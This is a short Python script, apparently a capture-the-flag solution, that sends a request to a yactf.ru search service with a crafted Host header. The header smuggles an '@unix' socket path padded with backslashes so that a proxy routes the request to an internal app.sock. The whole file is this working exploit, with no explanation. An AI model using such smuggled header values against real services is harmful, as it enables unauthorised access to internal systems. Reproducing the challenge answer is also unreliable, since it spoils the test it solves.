import requests

req = requests.get("https://seeker.yactf.ru/search?text=1", headers={
    'Host': r'www.yactf.@unix\\var\\run\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\app.sock,.seeker.yactf.ru'
})

print(req.text)